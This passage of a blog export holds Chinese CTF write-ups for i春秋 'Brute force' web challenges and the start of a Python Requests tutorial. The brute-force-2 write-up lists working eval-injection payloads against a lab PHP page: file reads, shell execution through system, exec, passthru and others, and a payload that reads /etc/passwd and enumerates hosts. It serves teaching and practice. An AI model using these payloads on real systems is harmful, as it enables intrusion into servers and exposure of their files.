<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-1/flag.png" alt="flag"></p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
        <tag>RegEx</tag>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】 Web —— 爆破-2</title>
    <url>/2018/08/31/ichunqiu-web-brute-force-2/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题出自「百度杯」CTF 比赛 2017 二月场，是第二道 「爆破」系列的 Web 题，重点考察大家对 PHP <strong>文件系统函数</strong>与<strong>命令执行函数</strong>的熟练度，难度中低，需要的基础知识有：<strong>PHP、Bash</strong>。</p>
<p>题目链接在「i春秋」的 CTF 大本营，解题链接通过创建在线靶场后得到：</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=1&r=57475">https://www.ichunqiu.com/battalion?t=1&r=57475</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/question.png" alt="question"></p>
<h1 id="0x01-利用文件系统函数"><a href="#0x01-利用文件系统函数" class="headerlink" title="0x01 利用文件系统函数"></a>0x01 利用文件系统函数</h1><p>打开链接，发现 PHP 源码与第一题的类似，只不过是少了对 <code>hello</code> 参数值的正则匹配：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>根据提示，flag 不再藏于某变量中，再由第 2 行的文件包含语句，推测 flag 应该在 flag.php 文件里。</p>
<p>因此，我们先尝试利用<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>来读取 flag.php 文件的内容，本题依旧与「爆破」关系不大。</p>
<h2 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h2><p><a href="http://php.net/manual/en/function.file.php"><code>file()</code></a> 函数用于将整个文件读入数组中。</p>
<p>尝试构造 payload <code>hello=file(&quot;flag.php&quot;)</code>，提交后直接看到 flag，证明推测正确：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/file.png" alt="file"></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p><a href="http://php.net/manual/en/function.file-get-contents.php"><code>file_get_contents()</code></a> 函数用于将整个文件读入到一个字符串中。</p>
<p>尝试构造 payload <code>hello=file_get_contents(&quot;flag.php&quot;) </code>，提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 <code>&lt;?php</code> 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/file-get-contents.png" alt="file-get-contents"></p>
<h2 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h2><p><a href="http://php.net/manual/en/function.show-source.php"><code>show_source()</code></a> 函数等同于 <a href="http://php.net/manual/en/function.highlight-file.php"><code>highlight_file()</code></a> 函数，可将一个 PHP 脚本文件语法高亮。</p>
<p>尝试构造 payload <code>hello=show_source(&quot;flag.php&quot;)</code>，提交后能看到语法高亮后的 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/show-source.png" alt="show-source"></p>
<h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2><p><a href="http://php.net/manual/en/function.readfile.php"><code>readfile()</code></a> 函数用于读取一个文件并写入到输出缓冲区。</p>
<p>在提交 payload <code>hello=readfile(&quot;flag.php&quot;)</code> 后，在网页源代码处可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/readfile.png" alt="readfile"></p>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h2><p><a href="http://php.net/manual/en/function.fread.php"><code>fread()</code></a> 函数用于读取二进制文件，不过首先得用 <a href="http://php.net/manual/en/function.fopen.php"><code>fopen()</code></a> 函数创建文件句柄，填入第一个参数，并在第二个参数中填入可读取的最大字节数。</p>
<p>因此，构造 payload <code>hello=fread(fopen(&quot;flag.php&quot;,&quot;r&quot;),100)</code>，提交后在网页源代码处可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/fread.png" alt="fread"></p>
<p>以上是直接读取脚本文件源码的常见函数，感兴趣的读者可深入研究。</p>
<h1 id="0x02-利用命令执行函数"><a href="#0x02-利用命令执行函数" class="headerlink" title="0x02 利用命令执行函数"></a>0x02 利用命令执行函数</h1><p>下面介绍另一种获取文件内容的方式，即利用 PHP 中的<a href="http://php.net/manual/en/ref.exec.php">命令执行函数</a>，通过执行系统命令以显示文件内容。</p>
<p>首先，由预定义常量 <a href="http://php.net/manual/en/reserved.constants.php"><code>PHP_OS</code></a> 可知后台操作系统的类型，构造 <code>hello=PHP_OS</code> 提交后，发现是 Linux 操作系统：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/php-os.png" alt="php-os"></p>
<h2 id="执行运算符"><a href="#执行运算符" class="headerlink" title="执行运算符"></a>执行运算符</h2><p>PHP 的<a href="http://php.net/manual/en/language.operators.execution.php">执行运算符</a>为反引号「&#96;」，可将反引号之间的内容作为 shell 命令执行，并返回所有执行结果。</p>
<p>在构造 payload 之前，需要做两件事：</p>
<ul>
<li>闭合前面的 <code>var_dump(</code> 字符串。</li>
<li>注释后面的 <code>);</code> 字符串。</li>
</ul>
<p>因此，构造 payload <code>hello=);echo `cat flag.php`;//</code>，提交后在网页源代码处即可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/backticks.png" alt="backticks"></p>
<h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p><a href="http://php.net/manual/en/function.system.php"><code>system()</code></a> 函数用于执行外部程序，输出执行结果，并返回结果的最后一行。</p>
<p>因此，在提交 payload <code>hello=);echo system(&quot;cat flag.php&quot;);//</code> 后，在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/system.png" alt="system"></p>
<h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p><a href="http://php.net/manual/en/function.exec.php"><code>exec()</code></a> 函数用于执行一个外部程序，并返回结果的最后一行。</p>
<p>因此，在提交 payload <code>hello=);echo exec(&quot;cat flag.php&quot;);//</code> 后，直接可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/exec.png" alt="exec"></p>
<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p><a href="http://php.net/manual/en/function.shell-exec.php"><code>shell_exec()</code></a> 函数可通过 shell 环境执行命令，并返回所有执行结果，本函数功能与执行运算符相同。</p>
<p>因此，构造 payload <code>hello=);echo shell_exec(&quot;cat flag.php&quot;);//</code>，提交后在网页源代码处即可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/shell-exec.png" alt="shell-exec"></p>
<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p><a href="http://php.net/manual/en/function.passthru.php"><code>passthru()</code></a> 函数用于执行外部函数，并输出原始执行结果，没有返回值。</p>
<p>因此，构造 payload <code>hello=);echo passthru(&quot;cat flag.php&quot;);//</code>，提交后在网页源代码处即可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/passthru.png" alt="passthru"></p>
<h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p><a href="http://php.net/manual/en/function.popen.php"><code>popen()</code></a> 函数用于创建指向命令执行进程的文件句柄，与 <code>fopen()</code> 函数类似，最后将通过 <code>fread()</code> 函数读取命令执行的结果。</p>
<p>因此，构造 payload <code>hello=);echo fread(popen(&quot;cat flag.php&quot;,&quot;r&quot;),100);//</code>，提交后在网页源代码处即可看到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/popen.png" alt="popen"></p>
<p>以上是通过执行系统命令打印出文件内容的常见函数，感兴趣的读者可深入研究。</p>
<h1 id="0x03-题外话"><a href="#0x03-题外话" class="headerlink" title="0x03 题外话"></a>0x03 题外话</h1><p>既然能执行系统命令，可拓展的思路那就多了，比如存在目录遍历漏洞、查看当前 Linux 版本信息、查看当前网卡信息、查看当前进程信息、查看所有用户信息等。</p>
<p>下面以 <code>pathssru()</code> 函数为例，简单地介绍一下命令执行漏洞的利用方法。</p>
<h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p><a href="https://en.wikipedia.org/wiki/Directory_traversal_attack">目录遍历漏洞</a>是由于系统未过滤用户输入的目录跳转符 <code>../</code>，导致恶意用户可通过不断提交若干个目录跳转符，从而遍历系统中的所有目录。</p>
<p>经过笔者不断尝试，查看大部分目录下有哪些文件是没问题的，如提交 payload <code>hello=);echo passthru(&quot;ls ../../../&quot;);//</code> 后，即可看到根目录下的所有文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/ls.png" alt="ls"></p>
<h2 id="查看当前-Linux-版本信息"><a href="#查看当前-Linux-版本信息" class="headerlink" title="查看当前 Linux 版本信息"></a>查看当前 Linux 版本信息</h2><p>通过 <code>uname -a</code> 命令可查看当前 Linux 版本信息。</p>
<p>因此，构造 payload <code>hello=);echo passthru(&quot;uname -a&quot;);//</code>，提交后可见当前 Linux 内核版本为 <code>3.10.0-514.26.2.el7.x86_64 </code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/uname.png" alt="uname"></p>
<h2 id="查看当前网卡信息"><a href="#查看当前网卡信息" class="headerlink" title="查看当前网卡信息"></a>查看当前网卡信息</h2><p>通过 <code>ifconfig</code> 命令可查看当前网卡信息。</p>
<p>因此，构造 payload <code>hello=);echo passthru(&quot;ifconfig&quot;);//</code>，提交后可见 eth0 网卡的 IP 地址为 <code>172.17.0.26</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/ifconfig.png" alt="ifconfig"></p>
<h2 id="查看当前进程信息"><a href="#查看当前进程信息" class="headerlink" title="查看当前进程信息"></a>查看当前进程信息</h2><p>通过 <code>ps aux</code> 命令可查看当前进程信息。</p>
<p>因此，构造 payload <code>hello=);echo passthru(&quot;ps aux&quot;);//</code>，提交后可见当前所有进程的信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/ps.png" alt="ps"></p>
<h2 id="查看所有用户信息"><a href="#查看所有用户信息" class="headerlink" title="查看所有用户信息"></a>查看所有用户信息</h2><p>通过 <code>cat /etc/passwd </code> 命令可查看所有用户信息。</p>
<p>因此，构造 payload <code>hello=);echo passthru(&quot;cat /etc/passwd&quot;);//</code>，提交后可见当前所有用户的信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-2/passwd.png" alt="passwd"></p>
<p>其中当前的用户名是 <code>apache</code>，不要问我是怎么知道的。</p>
<p>到此为止，这道题就告一段落了，读者感兴趣的话可挖掘更多的玩法，只可惜当前用户不是 root，不然可玩性就更高了：)</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
        <tag>i春秋</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】 Web —— 爆破-3</title>
    <url>/2018/09/11/ichunqiu-web-brute-force-3/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题出自「百度杯」CTF 比赛 2017 二月场，是第三道 「爆破」系列的 Web 题，主要考察在理解了题目 PHP 代码的逻辑后，<strong>通过网络编程与服务器交互获取 flag</strong> 的能力，难度中低，需要的基础知识有：<strong>PHP、Python、HTTP协议</strong>。</p>
<p>题目链接在「i春秋」的 CTF 大本营，解题链接通过创建在线靶场后得到：</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=1&r=57475">https://www.ichunqiu.com/battalion?t=1&r=57475</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/question.png" alt="question"></p>
<h1 id="0x01-理解-PHP-代码逻辑"><a href="#0x01-理解-PHP-代码逻辑" class="headerlink" title="0x01 理解 PHP 代码逻辑"></a>0x01 理解 PHP 代码逻辑</h1><p>打开链接，发现本题的 PHP 源码比前两题要复杂，做审计题首先是要理解代码逻辑：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;<span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">  <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = <span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">25</span>)].<span class="variable">$str_rand</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>]==(<span class="variable">$value</span>[<span class="number">0</span>].<span class="variable">$value</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Line 3~9：开始会话，包含 flag.php 文件，为超级全局变量 <a href="http://php.net/manual/en/reserved.variables.session.php"><code>$_SESSION</code></a> 的三个参数初始化。</li>
<li>Line 11~13：若 Session 有效期超过了两分钟，则销毁当前会话。</li>
<li>Line 15~17：先通过 GET 请求或 POST 请求获取的 <code>value</code> 参数，再随机选择两个小写字母拼接成字符串。</li>
<li>Line 19~23：若 <code>$_SESSION[&#39;whoami&#39;]</code> 等于 <code>$value</code> 数组中两个元素的拼接，并且 <code>$value</code> 的 MD5 哈希值的第 5 至 8 位等于 0，则将 <code>$_SESSION[&#39;nums&#39;]</code> 自增，将 <code>$_SESSION[&#39;whoami&#39;]</code> 更新为随机字符串并输出。</li>
<li>Line 25~27：若 <code>$_SESSION[&#39;nums&#39;]</code> 大于等于 10，则输出 flag。</li>
</ul>
<p>理解了代码逻辑后，再结合提示，基本可判断此题真的需要通过网络交互，来「爆破」获取 flag。</p>
<h1 id="0x02-编写-Python-网络通信脚本"><a href="#0x02-编写-Python-网络通信脚本" class="headerlink" title="0x02 编写 Python 网络通信脚本"></a>0x02 编写 Python 网络通信脚本</h1><p>本题的难点是<strong>如何通过 GET 或 POST 请求，传送同一数组参数的不同元素值</strong>。常见方法有以下两种：</p>
<ul>
<li><code>value[]=e&amp;value[]=a</code></li>
<li><code>value[0]=e&amp;value[1]=a</code></li>
</ul>
<p>使用 Firefox 浏览器，针对 GET 请求进行验证。第一种方法：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/method1.png" alt="method1"></p>
<p>第二种方法：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/method2.png" alt="method2"></p>
<p>针对 POST 请求同样适用，请读者自行验证。</p>
<p>将页面显示的新值传入 <code>value</code> 参数后，按上述方法手动循环 10 次，即可满足输出 flag 的条件，但只仅对于次数少的情况有效，如果循环 100 次，还想继续手动操作吗？这时，使用 Python 的<strong>第三方开源库 <a href="https://requests.kennethreitz.org/en/master/">Requests</a></strong> 编写自动化脚本，即可轻松解决问题，基本用法可参考：</p>
<blockquote>
<p><a href="https://ciphersaw.github.io/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/">详解 CTF Web 中的快速反弹 POST 请求</a></p>
</blockquote>
<p>以下是针对 GET 请求构造的 Python 解题脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">whoami = <span class="string">&quot;ea&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(whoami)</span><br><span class="line">	payload = <span class="string">&quot;?value[0]=&#123;&#125;&amp;value[1]=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(whoami[<span class="number">0</span>], whoami[<span class="number">1</span>])</span><br><span class="line">	response = s.get(url + payload)</span><br><span class="line">	whoami = response.text[:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 8~12：自动循环提交 10 次 GET 请求，并输出每次循环的 <code>value</code> 参数。</li>
<li>Line 13：将最后一次响应的报文内容输出，即可看到 flag。</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/flag.png" alt="flag"></p>
<p>将第 10 行改为 <code>payload = &quot;?value[]=&#123;&#125;&amp;value[]=&#123;&#125;&quot;.format(whoami[0], whoami[1])</code> 同样能获得 flag。</p>
<h1 id="0x03-使用-BurpSuite-抓取-Python-流量数据"><a href="#0x03-使用-BurpSuite-抓取-Python-流量数据" class="headerlink" title="0x03 使用 BurpSuite 抓取 Python 流量数据"></a>0x03 使用 BurpSuite 抓取 Python 流量数据</h1><p>针对 GET 请求直接构造字符串 payload 相对简单，如果使用 POST 请求，还需要构造表单数据的 <code>dict</code> 类型变量。以下是针对 POST 请求构造的 Python 解题脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">whoami = <span class="string">&quot;ea&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(whoami)</span><br><span class="line">	payload = &#123;<span class="string">&quot;value[0]&quot;</span>: whoami[<span class="number">0</span>], <span class="string">&quot;value[1]&quot;</span>: whoami[<span class="number">1</span>]&#125; </span><br><span class="line">	response = s.post(url, data = payload)</span><br><span class="line">	whoami = response.text[:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>显而易见，只有第 10、11 行与 GET 请求不同，运行完上述脚本后也能获得 flag。不过，当我们依葫芦画瓢将第 10 行改为 <code>payload = &#123;&quot;value[]&quot;: whoami[0], &quot;value[]&quot;: whoami[1]&#125; </code> 后，却发现无法获得 flag 了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/flag-failure.png" alt="flag-failure"></p>
<p>借此机会，讲解一下如何使用 Burp Suite 抓取 Python 发送的网络请求包，相信大家看到请求包后，答案便一目了然。以下是利用代理抓取 POST 请求包的 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">whoami = <span class="string">&quot;ea&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;value[]&quot;</span>: whoami[<span class="number">0</span>], <span class="string">&quot;value[]&quot;</span>: whoami[<span class="number">1</span>]&#125; </span><br><span class="line">burp = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">response = s.post(url, data = payload, proxies = burp)</span><br></pre></td></tr></table></figure>

<ul>
<li>构造 POST 请求中 <a href="https://requests.kennethreitz.org/en/master/user/advanced/#proxies"><code>proxies</code> 代理参数</a>的 <code>dict</code> 类型变量，其中 <code>http</code> 是代理访问 URL 的协议类型，<code>127.0.0.1:8080</code> 是 Burp Suite 的本地监听地址与端口号。</li>
</ul>
<p>将 Burp Suite 开启 Intercept 模式，运行上述脚本即可看到：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/burp-failure.png" alt="burp-failure"></p>
<p>可发现表单数据只剩 <code>value[]=a</code>，原来前面 <code>value[]=e</code> 的值已被覆盖。那么问题来了，如何构造 POST 请求中不带索引的同一数组参数的不同值呢？</p>
<p>正确的构造方法是 <code>payload = &#123;&quot;value[]&quot;: [whoami[0], whoami[1]]&#125; </code> ，再次运行脚本，即可看到表单数据正常提交了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/burp-success.png" alt="burp-success"></p>
<p>其实，使用 requests 模块自带的方法也能查看请求头与请求体，对应的 Python 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">whoami = <span class="string">&quot;ea&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;value[]&quot;</span>: [whoami[<span class="number">0</span>], whoami[<span class="number">1</span>]]&#125; </span><br><span class="line">response = s.post(url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(response.request.headers)</span><br><span class="line"><span class="built_in">print</span>(response.request.body)</span><br></pre></td></tr></table></figure>

<p>运行后即可在终端上看到请求头与请求体：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-web-brute-force-3/requests-body.png" alt="requests-body"></p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
        <tag>i春秋</tag>
        <tag>Python</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>详解 CTF Web 中的快速反弹 POST 请求</title>
    <url>/2017/12/16/illustration-of-quick-rebound-of-post-request-in-ctf-web/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在 CTF Web 的基础题中，经常出现一类题型：在 HTTP 响应头获取了一段有效期很短的 key 值后，需要将经过处理后的 key 值快速 POST 给服务器，若 key 值还在有效期内，则服务器返回最终的 flag，否则继续提示“请再加快速度！！！”</p>
<p>如果还执着于手动地获取 key 值，复制下来对其进行处理，最后用相应的工具把 key 值 POST 给服务器，那么对不起，因为 key 值的有效期一般都在 1 秒左右，除非有单身一百年的手速，否则不要轻易尝试。显然，这类题不是通过纯手工完成的，幸好 Python 提供了简单易用、功能强大的 HTTP <strong>第三方开源库 <a href="https://requests.kennethreitz.org/en/master/">Requests</a></strong> ，帮助我们轻松解决关于 HTTP 的大部分问题。</p>
<span id="more"></span>

<h1 id="0x01-Python-Requests"><a href="#0x01-Python-Requests" class="headerlink" title="0x01 Python Requests"></a>0x01 Python Requests</h1><p>关于 Requests 库的详细功能请见官方文档，本文只列出解题中需要用到的部分功能。</p>
<h2 id="安装并导入-requests-模块"><a href="#安装并导入-requests-模块" class="headerlink" title="安装并导入 requests 模块"></a>安装并导入 requests 模块</h2><p>在安装了 Python 的终端下输入以下命令安装 requests：</p>
<pre><code>$ pip install requests
</code></pre>
<p>安装完使用以下命令导入 requests：</p>
<pre><code>&gt;&gt;&gt; import requests
</code></pre>
<h2 id="发送-GET-请求与-POST-请求"><a href="#发送-GET-请求与-POST-请求" class="headerlink" title="发送 GET 请求与 POST 请求"></a>发送 GET 请求与 POST 请求</h2><p>以 Github 官网为例，对其发起 GET 请求;</p>
<pre><code>&gt;&gt;&gt; r = requests.get(&#39;https://github.com/&#39;)
</code></pre>
<p>对其发起 POST 请求：</p>
<pre><code>&gt;&gt;&gt; r = requests.post(&#39;https://github.com/&#39;)
</code></pre>
<h2 id="查看请求头"><a href="#查看请求头" class="headerlink" title="查看请求头"></a>查看请求头</h2><p>对 Github 官网发起请求，以查看 GET 请求的请求头为例，POST 请求同理：</p>
<pre><code>&gt;&gt;&gt; r = requests.get(&#39;https://github.com/&#39;)
&gt;&gt;&gt; r.request.headers
&#123;&#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,...
</code></pre>
<p>查看请求头的某一属性：</p>
<pre><code>&gt;&gt;&gt; r.request.headers[&#39;Accept-Encoding&#39;]
&#39;gzip, deflate&#39;
</code></pre>
<h2 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h2><p>对 Github 官网发起请求，以查看 GET 请求的响应头为例，POST 请求同理：</p>
<pre><code>&gt;&gt;&gt; r = requests.get(&#39;https://github.com/&#39;)
